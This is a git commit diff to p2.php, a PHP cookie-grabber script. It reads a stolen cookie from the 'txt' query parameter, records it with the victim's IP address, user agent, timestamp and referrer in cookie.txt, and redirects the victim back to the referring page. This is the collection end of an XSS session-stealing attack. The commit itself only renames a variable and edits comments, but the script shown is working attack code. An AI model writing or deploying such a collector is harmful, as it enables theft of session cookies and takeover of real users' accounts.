6d0c112d65b117d3209e5c428c411cef771352d4
itismhn <itismhn@yahoo.com>
2023-03-17 11:54:07 +0330

    update p2.php

--- p2.php
+++ p2.php
@@ -5,17 +5,16 @@ $date=date("Y-m-d H:i:s");
 $cookie=$_GET['txt'];
 $ip=$_SERVER['REMOTE_ADDR'];
 $agent=$_SERVER['HTTP_USER_AGENT'];
-$referer = $_SERVER['HTTP_REFERER'] ?? null;
+$referrer = $_SERVER['HTTP_REFERER'] ?? null;
 //store data
 $log="cookie = $cookie\n";
 $log.="ip = $ip\n";
 $log.="agent = $agent\n";
 $log.="date = $date\n";
-$log.="REFERER = $referer\n";
+$log.="REFERRER = $referrer\n";
 $log.="=======\n";
 $f=fopen("cookie.txt","a");
 fwrite($f,$log);
-//$reefer=str_replace("window","wnidow",$reefer);
-//$a=split("/",$referer);
-header('Location:'. $referer);
+//redirect to referrer
+header('Location:'. $referrer);
 ?>
